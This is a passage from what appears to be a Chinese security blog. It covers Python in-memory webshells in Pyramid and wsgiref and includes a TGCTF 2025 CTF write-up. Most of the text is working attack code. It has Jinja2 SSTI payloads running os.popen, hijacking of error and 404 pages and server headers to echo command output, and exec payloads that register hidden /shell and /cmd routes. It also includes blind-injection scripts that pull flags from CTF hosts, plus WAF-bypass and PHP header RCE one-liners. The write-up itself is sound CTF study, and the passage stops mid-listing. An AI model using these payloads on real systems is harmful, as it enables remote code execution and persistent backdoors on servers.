但是config在main函数里面，不是全局变量没法用\npyramid钩子函数 看官方文档use hook:Using Hooks — The Pyramid Web Application Development Framework v1.4.9\n发现 request 也存在钩子函数\n可以利用request.add_response_callback来构造回显\n1 2 request.add_response_callback(lambda request, response: setattr(response, \u0026#39;text\u0026#39;, __import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read())) 再套进 exec 方法中\n1 2 3 4 5 6 {{cycler.__init__.__globals__.__builtins__[\u0026#39;exec\u0026#39;] (\u0026#34;request.add_response_callback(lambda request, response: setattr(response, \u0026#39;text\u0026#39;, __import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read()))\u0026#34;,{\u0026#39;request\u0026#39;: request})}} {{x.__init__.__globals__.__builtins__[\u0026#39;exec\u0026#39;] (\u0026#34;request.add_response_callback(lambda request, response: setattr(response, \u0026#39;text\u0026#39;, __import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read()))\u0026#34;,{\u0026#39;request\u0026#39;: request})}} 注意最后的 {'request': request} ，声明 request，因为在 exec 的作用域中没有 request，需要进行 声明，最后得到回显进行命令执行\n或者用这个request.add_finished_callback也能打回显\n利用header头外带回显 这里参考：wsgiref应用无回显详细调试研究-先知社区\n先调试找请求过程\n1 2 3 4 5 6 7 8 def process_request(self, request, client_address): \u0026#34;\u0026#34;\u0026#34;Call finish_request. Overridden by ForkingMixIn and ThreadingMixIn. \u0026#34;\u0026#34;\u0026#34; self.finish_request(request, client_address) self.shutdown_request(request) 跟进finish_request\n1 2 3 def finish_request(self, request, client_address): \u0026#34;\u0026#34;\u0026#34;Finish one request by instantiating RequestHandlerClass.\u0026#34;\u0026#34;\u0026#34; self.RequestHandlerClass(request, client_address, self) 跟进RequestHandlerClass类的handler方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 def handle(self): \u0026#34;\u0026#34;\u0026#34;Handle a single HTTP request\u0026#34;\u0026#34;\u0026#34; self.raw_requestline = self.rfile.readline(65537) if len(self.raw_requestline) \u0026gt; 65536: self.requestline = \u0026#39;\u0026#39; self.request_version = \u0026#39;\u0026#39; self.command = \u0026#39;\u0026#39; self.send_error(414) return if not self.parse_request(): # An error code has been sent, just exit return handler = ServerHandler( self.rfile, self.wfile, self.get_stderr(), self.get_environ(), multithread=False, ) handler.request_handler = self # backpointer for logging handler.run(self.server.get_app()) 跟进run方法，看到finish_reponse，继续跟进\n1 2 3 4 5 try: if not self.result_is_file() or not self.sendfile(): for data in self.result: self.write(data) self.finish_content() 跟进write,把 data 写入返回的 body 中，然后调用了send_headler,继续跟进\n1 2 3 4 5 6 7 def send_headers(self): \u0026#34;\u0026#34;\u0026#34;Transmit headers to the client, via self._write()\u0026#34;\u0026#34;\u0026#34; self.cleanup_headers() self.headers_sent = True if not self.origin_server or self.client_is_modern(): self.send_preamble() self._write(bytes(self.headers)) 跟进send_preamble\n1 2 3 4 5 6 7 8 9 10 11 12 13 def send_preamble(self): \u0026#34;\u0026#34;\u0026#34;Transmit version/status/date/server, via self._write()\u0026#34;\u0026#34;\u0026#34; if self.origin_server: if self.client_is_modern(): self._write((\u0026#39;HTTP/%s %s\\r\\n\u0026#39; % (self.http_version,self.status)).encode(\u0026#39;iso-8859-1\u0026#39;)) if \u0026#39;Date\u0026#39; not in self.headers: self._write( (\u0026#39;Date: %s\\r\\n\u0026#39; % format_date_time(time.time())).encode(\u0026#39;iso-8859-1\u0026#39;) ) if self.server_software and \u0026#39;Server\u0026#39; not in self.headers: self._write((\u0026#39;Server: %s\\r\\n\u0026#39; % self.server_software).encode(\u0026#39;iso-8859-1\u0026#39;)) else: self._write((\u0026#39;Status: %s\\r\\n\u0026#39; % self.status).encode(\u0026#39;iso-8859-1\u0026#39;)) 看到最后的 header 头就是在这里进行的赋值，是每次请求进行的动态赋值，那么可以通过 ssti 将其修改为我们的回显\n1 self._write((\u0026#39;HTTP/%s %s\\r\\n\u0026#39; % (self.http_version,self.status)).encode(\u0026#39;iso-8859-1\u0026#39;)) 可以看到 self 是\n1 \u0026lt;wsgiref.simple_server.ServerHandler object at 0x00000227DAC28850\u0026gt; 先寻找对象，然后打ssti污染就行了\n1 2 先找到wsgiref {{lipsum.__spec__.__init__.__globals__.sys.modules}} 1 2 找到simple_server {{lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.__dict__}} 1 2 找到handler {{lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.ServerHandler}} 然后跟flask一样修改值\n1 {{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.ServerHandler,\u0026#34;http_version\u0026#34;,lipsum.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read())}} 或者还有其他可利用的点\n刚刚的send_preamble里面还有可以利用的\n1 self._write((\u0026#39;Server: %s\\r\\n\u0026#39; % self.server_software).encode(\u0026#39;iso-8859-1\u0026#39;)) 尝试修改\n1 {{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.ServerHandler,\u0026#34;server_software\u0026#34;,lipsum.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read())}} 1 2 3 4 {{cycler.__init__.__globals__.__builtins__[\u0026#39;setattr\u0026#39;] (cycler.__init__.__globals__.__builtins__.__import__(\u0026#39;sys\u0026#39;).modules[\u0026#39;wsgiref\u0026#39;].si mple_server.ServerHandler,\u0026#39;server_software\u0026#39;,cycler.__init__.__globals__.__builtin s__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read())}} HTTP错误回显 这里研究最近比赛中别的师傅常用的胁持错误回显界面的内存马\n500状态码 当我触发时页面回显如下字段\n1 A server error occurred. Please contact the administrator. 我们从源代码中搜索定位，发现是Basehandler的一个属性error_body\n注意error_body类型是bytes类型 ，所以我们可以对read()返回回来的数据实现encode转换\n1 2 3 {{lipsum[\u0026#39;__globals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;setattr\u0026#39;]((((lipsum|attr(\u0026#39;__spec__\u0026#39;))|attr(\u0026#39;__init__\u0026#39;)|attr(\u0026#39;__globals__\u0026#39;))[\u0026#39;sys\u0026#39;]|attr(\u0026#39;modules\u0026#39;))[\u0026#39;wsgiref\u0026#39;]|attr(\u0026#39;handlers\u0026#39;)|attr(\u0026#39;BaseHandler\u0026#39;),\u0026#39;error_body\u0026#39;,lipsum[\u0026#39;__globals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;)[\u0026#39;popen\u0026#39;](\u0026#39;whoami\u0026#39;)[\u0026#39;read\u0026#39;]()[\u0026#39;encode\u0026#39;]())}} {{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.ServerHandler,\u0026#34;error_body\u0026#34;,lipsum.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read())}} 404状态码 根据404回显找到pyramid.httpexceptions.HTTPNotFound类\n发现explanation也是bytes类型，污染属性explanation来404回显\n1 {{lipsum[\u0026#39;__globals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;exec\u0026#39;](\u0026#34;setattr(Not,\u0026#39;explanation\u0026#39;,shell)\u0026#34;,{\u0026#34;Not\u0026#34;:((lipsum|attr(\u0026#39;__spec__\u0026#39;)|attr(\u0026#39;__init__\u0026#39;)|attr(\u0026#39;__globals__\u0026#39;))[\u0026#39;sys\u0026#39;]|attr(\u0026#39;modules\u0026#39;))[\u0026#39;pyramid\u0026#39;][\u0026#39;httpexceptions\u0026#39;][\u0026#39;HTTPNotFound\u0026#39;],\u0026#34;shell\u0026#34;:lipsum[\u0026#39;__globals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;)[\u0026#39;popen\u0026#39;](\u0026#39;whoami\u0026#39;)[\u0026#39;read\u0026#39;]()})}} 或者\n1 {{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.pyramid.httpexceptions.HTTPNotFound,\u0026#34;explanation\u0026#34;,lipsum.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read())}} 也可以覆盖属性title来回显\n1 {{(lipsum[\u0026#39;__globals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;exec\u0026#39;])(\u0026#34;setattr(Not,\u0026#39;title\u0026#39;,shell)\u0026#34;,{\u0026#34;Not\u0026#34;:(((lipsum|attr(\u0026#39;__spec__\u0026#39;))|attr(\u0026#39;__init__\u0026#39;)|attr(\u0026#39;__globals__\u0026#39;))[\u0026#39;sys\u0026#39;]|attr(\u0026#39;modules\u0026#39;))[\u0026#39;pyramid\u0026#39;][\u0026#39;httpexceptions\u0026#39;][\u0026#39;HTTPNotFound\u0026#39;],\u0026#34;shell\u0026#34;:lipsum[\u0026#39;__globals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;)[\u0026#39;popen\u0026#39;](\u0026#39;whoami\u0026#39;)[\u0026#39;read\u0026#39;]()})}} 或者\n1 {{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.pyramid.httpexceptions.HTTPNotFound,\u0026#34;title\u0026#34;,lipsum.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read())}} 强网杯决赛pyramid app.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 from wsgiref.simple_server import make_server from pyramid.config import Configurator from pyramid.events import NewResponse from pyramid.response import Response import util users = [] super_user = [\u0026#34;admin\u0026#34;] default_alg = \u0026#34;RS\u0026#34; def register_api(request): try: username = request.params[\u0026#39;username\u0026#39;] if username in super_user: return Response(\u0026#34;Not Allowed!\u0026#34;) password = request.params[\u0026#39;password\u0026#39;] except: return Response(\u0026#39;Please Input username \u0026amp; password\u0026#39;, status=\u0026#34;500 Internal Server\u0026#34;) data = {\u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: password} users.append(data) token = util.data_encode(data, default_alg) return Response(\u0026#34;Here is your token: \u0026#34;+ token) def register_front(request): return Response(util.read_html(\u0026#39;register.html\u0026#39;)) def front_test(request): return Response(util.read_html(\u0026#39;test.html\u0026#39;)) def system_test(request): try: code = request.params[\u0026#39;code\u0026#39;] token = request.params[\u0026#39;token\u0026#39;] data = util.data_decode(token) if data: username = data[\u0026#39;username\u0026#39;] print(username) if username in super_user: print(\u0026#34;Welcome super_user!\u0026#34;) else: return Response(\u0026#39;Unauthorized\u0026#39;, status=\u0026#34;401 Unauthorized\u0026#34;) else: return Response(\u0026#39;Unauthorized\u0026#39;, status=\u0026#34;401 Unauthorized\u0026#34;) except: return Response(\u0026#39;Please Input code \u0026amp; token\u0026#39;) print(exec(code)) return Response(\u0026#34;Success!\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: with Configurator() as config: config.add_route(\u0026#39;register_front\u0026#39;, \u0026#39;/\u0026#39;) config.add_route(\u0026#39;register_api\u0026#39;, \u0026#39;/api/register\u0026#39;) config.add_route(\u0026#39;system_test\u0026#39;, \u0026#39;/api/test\u0026#39;) config.add_route(\u0026#39;front_test\u0026#39;, \u0026#39;/test\u0026#39;) config.add_view(system_test, route_name=\u0026#39;system_test\u0026#39;) config.add_view(front_test, route_name=\u0026#39;front_test\u0026#39;) config.add_view(register_api, route_name=\u0026#39;register_api\u0026#39;) config.add_view(register_front, route_name=\u0026#39;register_front\u0026#39;) app = config.make_wsgi_app() server = make_server(\u0026#39;0.0.0.0\u0026#39;, 6543, app) server.serve_forever() util.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 import base64 import json import uuid from Crypto.PublicKey import RSA from Crypto.Signature import pkcs1_15 from Crypto.Hash import SHA256 import hashlib secret = str(uuid.uuid4()) def generate_keys(): key = RSA.generate(2048) private_key = key.export_key() public_key = key.publickey().export_key() return private_key, public_key def sign_data(private_key, data): rsakey = RSA.import_key(private_key) # 将JSON数据转换为字符串 data_str = json.dumps(data) hash_obj = SHA256.new(data_str.encode(\u0026#39;utf-8\u0026#39;)) signature = pkcs1_15.new(rsakey).sign(hash_obj) return signature def verify_signature(secret, data, signature, alg): if alg == \u0026#39;RS\u0026#39;: rsakey = RSA.import_key(secret) # 将JSON数据转换为字符串 data_str = json.dumps(data) hash_obj = SHA256.new(data_str.encode(\u0026#39;utf-8\u0026#39;)) try: pkcs1_15.new(rsakey).verify(hash_obj, signature) print(\u0026#34;Signature is valid. Transmitted data:\u0026#34;, data) return True except (ValueError, TypeError): print(\u0026#34;Signature is invalid.\u0026#34;) return False elif alg == \u0026#39;HS\u0026#39;: hash_object = hashlib.sha256() data_bytes = (json.dumps(data) + secret.decode()).encode(\u0026#39;utf-8\u0026#39;) print(data_bytes) hash_object.update(data_bytes) hex_dig = hash_object.hexdigest() if hex_dig == signature.decode(): return True else: return False def data_encode(data, alg): if alg not in [\u0026#39;HS\u0026#39;, \u0026#39;RS\u0026#39;]: raise \u0026#34;Algorithm must be HS or RS!\u0026#34; else: private_key, public_key = generate_keys() if alg == \u0026#39;RS\u0026#39;: signature = sign_data(private_key, data) data_bytes = json.dumps(data).encode(\u0026#39;utf-8\u0026#39;) encoded_data1 = base64.b64encode(data_bytes) # data encoded_data2 = base64.b64encode(signature) # signature print(encoded_data2) encoded_data3 = base64.b64encode(alg.encode(\u0026#39;utf-8\u0026#39;)) # alg encoded_data4 = base64.b64encode(public_key) # public_key encoded_data = encoded_data1.decode() + \u0026#39;.\u0026#39; + encoded_data2.decode() + \u0026#39;.\u0026#39; + encoded_data3.decode() + \u0026#39;.\u0026#39; + encoded_data4.decode() print(\u0026#34;The encoded data is: \u0026#34;, encoded_data) return encoded_data else: hash_object = hashlib.sha256() data_bytes = (json.dumps(data) + secret).encode(\u0026#39;utf-8\u0026#39;) inputdata = json.dumps(data).encode(\u0026#39;utf-8\u0026#39;) hash_object.update(data_bytes) hex_dig = hash_object.hexdigest() signature = base64.b64encode(hex_dig.encode(\u0026#39;utf-8\u0026#39;)) encoded_data1 = base64.b64encode(inputdata) # data encoded_data3 = base64.b64encode(alg.encode(\u0026#39;utf-8\u0026#39;)) # alg encoded_data = encoded_data1.decode() + \u0026#39;.\u0026#39; + signature.decode() + \u0026#39;.\u0026#39; + encoded_data3.decode() print(\u0026#34;The encoded data is: \u0026#34;, encoded_data) return encoded_data def data_decode(encode_data): try: all_data = encode_data.split(\u0026#39;.\u0026#39;) sig_bytes = all_data[1].replace(\u0026#39; \u0026#39;, \u0026#39;+\u0026#39;).encode(\u0026#39;utf-8\u0026#39;) print(sig_bytes) data = base64.b64decode(all_data[0].replace(\u0026#39; \u0026#39;, \u0026#39;+\u0026#39;)).decode(\u0026#39;utf-8\u0026#39;) json_data = json.loads(data) signature = base64.b64decode(sig_bytes) alg = base64.b64decode(all_data[2]).decode(\u0026#39;utf-8\u0026#39;) key = secret if len(all_data) == 4: key_bytes = all_data[3].replace(\u0026#39; \u0026#39;, \u0026#39;+\u0026#39;).encode(\u0026#39;utf-8\u0026#39;) key = base64.b64decode(key_bytes) # bytes # 验证签名 is_valid = verify_signature(key, json_data, signature, alg) if is_valid: return json_data else: return False except: raise \u0026#34;something error\u0026#34; def read_html(filname): with open(\u0026#39;./static/\u0026#39; + filname, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as file: # 读取文件内容 html_content = file.read() return html_content 上面一题由于config是局部变量获取不了，这题可以了\n直接上内存马payload\n1 exec(\u0026#34;import sys;config = sys.modules[\u0026#39;__main__\u0026#39;].config;app=sys.modules[\u0026#39;__main__\u0026#39;].app;print(config);config.add_route(\u0026#39;shell\u0026#39;, \u0026#39;/shell\u0026#39;);config.add_view(lambda request: Response(__import__(\u0026#39;os\u0026#39;).popen(request.params.get(\u0026#39;1\u0026#39;)).read()),route_name=\u0026#39;shell\u0026#39;);app = config.make_wsgi_app()\u0026#34;) ","date":"2025-04-16T00:00:00Z","image":"https://0d000721999.github.io/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/1.png","permalink":"https://0d000721999.github.io/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/","title":"python内存马学习"},{"content":"2025TGCTF复现 AAA偷渡阴平（复仇） 预期\nsession没禁用\n非预期\n1 /?tgctf2025=system(implode(apache_request_headers())); 1 /?tgctf2025=system(hex2bin(licfirst(key(apache_request_headers())))); 熟悉的配方，熟悉的味道 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 from pyramid.config import Configurator from pyramid.request import Request from pyramid.response import Response from pyramid.view import view_config from wsgiref.simple_server import make_server from pyramid.events import NewResponse import re from jinja2 import Environment, BaseLoader eval_globals = { #防止eval执行恶意代码 \u0026#39;__builtins__\u0026#39;: {}, # 禁用所有内置函数 \u0026#39;__import__\u0026#39;: None # 禁止动态导入 } def checkExpr(expr_input): expr = re.split(r\u0026#34;[-+*/]\u0026#34;, expr_input) print(exec(expr_input)) if len(expr) != 2: return 0 try: int(expr[0]) int(expr[1]) except: return 0 return 1 def home_view(request): expr_input = \u0026#34;\u0026#34; result = \u0026#34;\u0026#34; if request.method == \u0026#39;POST\u0026#39;: expr_input = request.POST[\u0026#39;expr\u0026#39;] if checkExpr(expr_input): try: result = eval(expr_input, eval_globals) except Exception as e: result = e else: result = \u0026#34;爬！\u0026#34; template_str = 【xxx】 env = Environment(loader=BaseLoader()) template = env.from_string(template_str) rendered = template.render(expr_input=expr_input, result=result) return Response(rendered) if __name__ == \u0026#39;__main__\u0026#39;: with Configurator() as config: config.add_route(\u0026#39;home_view\u0026#39;, \u0026#39;/\u0026#39;) config.add_view(home_view, route_name=\u0026#39;home_view\u0026#39;) app = config.make_wsgi_app() server = make_server(\u0026#39;0.0.0.0\u0026#39;, 9040, app) server.serve_forever() eval设了很严格的限制，但是没禁用exec\n用exec打内存马\n1 2 3 expr=exec(\u0026#34;config.add_route(\u0026#39;shell_route\u0026#39;,\u0026#39;/shell\u0026#39;);config.add_view(lambda request:Response(__import__(\u0026#39;os\u0026#39;).popen(request.params.get(\u0026#39;a\u0026#39;)).read()),route _name=\u0026#39;shell_route\u0026#39;);app = config.make_wsgi_app()\u0026#34;) 或者用request.add_response_callback 钩子函数进行回显。（是个好方法，但是这里用不了，因为exec不在home_view下没有request）\n1 2 3 print(exec(\u0026#34;request.add_response_callback(lambda request, response:setattr(response, \u0026#39;text\u0026#39;, getattr(getattr(__import__(\u0026#39;os\u0026#39;),\u0026#39;popen\u0026#39;) (\u0026#39;whoami\u0026#39;),\u0026#39;read\u0026#39;)()))\u0026#34;)); 其他办法\n利用抛出错误,用污染HTTP 500的返回消息实现回显,这里用wsgi打\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import requests url = \u0026#34;http://127.0.0.1:59183/\u0026#34; code = f\u0026#34;\u0026#34;\u0026#34; b = re.match.__globals__[\u0026#39;__builtins__\u0026#39;] b[\u0026#34;setattr\u0026#34;](b[\u0026#39;__import__\u0026#39;](\u0026#39;wsgiref\u0026#39;).handlers.BaseHandler,\u0026#34;error_body\u0026#34;,b[\u0026#34;__import__\u0026#34;](\u0026#39;os\u0026#39;).popen(\u0026#39;cat /flagggggg_tgctf2025_asjdklalkcnkjassjhdlk\u0026#39;).read().encode()) raise Exception(\u0026#34;1\u0026#34;) \u0026#34;\u0026#34;\u0026#34; resp = requests.post(url, data = { \u0026#34;expr\u0026#34;: f\u0026#34;exec({code!r})\u0026#34;, }) print(resp.status_code) print(resp.text) 同样的原理可以胁持404界面\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import requests url = \u0026#39;http://127.0.0.1:59183/\u0026#39; payload = \u0026#34;cat /flagggggg_tgctf2025_asjdklalkcnkjassjhdlk\u0026#34; exp = f\u0026#39;\u0026#39;\u0026#39; def shell(request): import os res = os.popen(\u0026#34;{payload}\u0026#34;).read() return Response(res) config.add_route(\u0026#39;cmd\u0026#39;, \u0026#39;/cmd\u0026#39;) config.add_view(shell, route_name=\u0026#39;cmd\u0026#39;) config.commit() \u0026#39;\u0026#39;\u0026#39; data = {\u0026#34;expr\u0026#34;: exp} res = requests.post(url, data=data) p = requests.get(url + \u0026#39;/cmd\u0026#39;) print(p.text) 时间盲注\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import string import time import os import requests url = \u0026#34;http://node1.tgctf.woooo.tech:31931/\u0026#34; ans = \u0026#34;\u0026#34; for i in range(0, 100): for strr in string.printable: shell = f\u0026#34;\u0026#34;\u0026#34; import os import time a = os.popen(\u0026#39;cat /fl*\u0026#39;).read() if len(a) \u0026gt; {i} and a[{i}] == \u0026#39;{strr}\u0026#39;: time.sleep(2) \u0026#34;\u0026#34;\u0026#34; start = time.time() requests.post(url, data={\u0026#39;expr\u0026#39;: shell}) end = time.time() if end - start \u0026gt; 2: ans += strr print(ans) 布尔盲注\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import string import requests from tqdm import tqdm url = \u0026#34;http://node1.tgctf.woooo.tech:30215\u0026#34; flag = \u0026#34;TGCTF{028b2d11-2783-464c-8cea-fda040\u0026#34; for i in range(len(flag),50): # for s in \u0026#39;TGCTF{\u0026#39;: for s in tqdm(\u0026#39;-\u0026#39;+\u0026#39;}\u0026#39;+\u0026#39;{\u0026#39;+string.ascii_lowercase+string.digits): data = {\u0026#34;expr\u0026#34;:f\u0026#34;import os,operator;f=os.popen(\u0026#39;cat /f*\u0026#39;).read();a=int(operator.eq(f[{i}],\u0026#39;{s}\u0026#39;));1/a\u0026#34;} # res = requests.post(url, data=json) res = requests.post(url, data=data) # print(res.text, s) if res.text != \u0026#34;A server error occurred. Please contact the administrator.\u0026#34;: flag += s print(flag) break print(i) 直面天命（复仇） fenjing一把梭（\n源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 import os import string from flask import Flask, request, render_template_string, jsonify, send_from_directory from a.b.c.d.secret import secret_key app = Flask(__name__) black_list=[\u0026#39;lipsum\u0026#39;,\u0026#39;|\u0026#39;,\u0026#39;%\u0026#39;,\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;,\u0026#39;map\u0026#39;,\u0026#39;chr\u0026#39;, \u0026#39;value\u0026#39;, \u0026#39;get\u0026#39;, \u0026#34;url\u0026#34;, \u0026#39;pop\u0026#39;,\u0026#39;include\u0026#39;,\u0026#39;popen\u0026#39;,\u0026#39;os\u0026#39;,\u0026#39;import\u0026#39;,\u0026#39;eval\u0026#39;,\u0026#39;_\u0026#39;,\u0026#39;system\u0026#39;,\u0026#39;read\u0026#39;,\u0026#39;base\u0026#39;,\u0026#39;globals\u0026#39;,\u0026#39;_.\u0026#39;,\u0026#39;set\u0026#39;,\u0026#39;application\u0026#39;,\u0026#39;getitem\u0026#39;,\u0026#39;request\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;arg\u0026#39;, \u0026#39;config\u0026#39;, \u0026#39;app\u0026#39;, \u0026#39;self\u0026#39;] def waf(name): for x in black_list: if x in name.lower(): return True return False def is_typable(char): # 定义可通过标准 QWERTY 键盘输入的字符集 typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace return char in typable_chars @app.route(\u0026#39;/\u0026#39;) def home(): return send_from_directory(\u0026#39;static\u0026#39;, \u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/jingu\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def greet(): template1=\u0026#34;\u0026#34; template2=\u0026#34;\u0026#34; name = request.form.get(\u0026#39;name\u0026#39;) template = f\u0026#39;{name}\u0026#39; if waf(name): template = \u0026#39;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹 Image\u0026#39; else: k=0 for i in name: if is_typable(i): continue k=1 break if k==1: if not (secret_key[:2] in name and secret_key[2:]): template = \u0026#39;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧 再去西行历练历练 Image\u0026#39; return render_template_string(template) template1 = \u0026#34;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“{{}}” 最后，如果你用了cat，就可以见到齐天大圣了 \u0026#34; template= template.replace(\u0026#34;天命\u0026#34;,\u0026#34;{{\u0026#34;).replace(\u0026#34;难违\u0026#34;,\u0026#34;}}\u0026#34;) template = template if \u0026#34;cat\u0026#34; in template: template2 = \u0026#39; 或许你这只叫天命人的猴子，真的能做到？ Image\u0026#39; try: return template1+render_template_string(template)+render_template_string(template2) except Exception as e: error_message = f\u0026#34;500报错了，查询语句如下： {template}\u0026#34; return error_message, 400 @app.route(\u0026#39;/hint\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def hinter(): template=\u0026#34;hint： 有一个aazz路由，去那里看看吧，天命人!\u0026#34; return render_template_string(template) @app.route(\u0026#39;/aazz\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def finder(): with open(__file__, \u0026#39;r\u0026#39;) as f: source_code = f.read() return f\u0026#34; {source_code} \u0026#34;, 200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/html; charset=utf-8\u0026#39;} if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=80) secret_key可以去原版本读到\n1 secret_key = \u0026#34;直面天命\u0026#34; fenjing操作\n1 2 3 4 5 6 7 8 9 10 from fenjing import exec_cmd_payload, config_payload def waf(s: str): blacklist = [\u0026#39;lipsum\u0026#39;,\u0026#39;|\u0026#39;,\u0026#39;%\u0026#39;,\u0026#39;map\u0026#39;,\u0026#39;chr\u0026#39;, \u0026#39;value\u0026#39;, \u0026#39;get\u0026#39;, \u0026#34;url\u0026#34;, \u0026#39;pop\u0026#39;,\u0026#39;include\u0026#39;,\u0026#39;popen\u0026#39;,\u0026#39;os\u0026#39;,\u0026#39;import\u0026#39;,\u0026#39;eval\u0026#39;,\u0026#39;_\u0026#39;,\u0026#39;system\u0026#39;,\u0026#39;read\u0026#39;,\u0026#39;base\u0026#39;,\u0026#39;globals\u0026#39;,\u0026#39;_.\u0026#39;,\u0026#39;set\u0026#39;,\u0026#39;application\u0026#39;,\u0026#39;getitem\u0026#39;,\u0026#39;request\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;arg\u0026#39;, \u0026#39;config\u0026#39;, \u0026#39;app\u0026#39;, \u0026#39;self\u0026#39;] return all(word not in s for word in blacklist) if __name__ == \u0026#34;__main__\u0026#34;: shell_payload, _ = exec_cmd_payload(waf, \u0026#34;cat /tgffff11111aaaagggggggg\u0026#34;) shell_payload = shell_payload.replace(\u0026#34;{{\u0026#34;, \u0026#34;天命\u0026#34;).replace(\u0026#34;}}\u0026#34;, \u0026#34;难违\u0026#34;) print(f\u0026#34;{shell_payload}\u0026#34;) 或者unicode绕\n1 直面天命g[\u0026#39;\\u0070\\u006f\\u0070\u0026#39;][\u0026#39;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f\u0026#39;][\u0026#39;\\u005f\\u005f\\u0062\\u0075\\u0069\\u006c\\u0074\\u0069\\u006e\\u0073\\u005f\\u005f\u0026#39;][\u0026#39;\\u005f\\u005f\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u005f\\u005f\u0026#39;](\u0026#39;so\u0026#39;[::-1])[\u0026#39;\\u0070\\u006f\\u0070\\u0065\\u006e\u0026#39;](\u0026#39;cat /*\u0026#39;)[\u0026#39;\\u0072\\u0065\\u0061\\u0064\u0026#39;]()难违 官方payload\n1 2 3 直面[][\u0026#34;\\x5f\\x5fclass\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5fmro\\x5f\\x5f\u0026#34;][1] [\u0026#34;\\x5f\\x5fsubclasses\\x5f\\x5f\u0026#34;]()[351](\u0026#39;cat flag\u0026#39;,shell=True,stdout=-1).communicate()[0].strip()天命 老登，炸鱼来了？ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 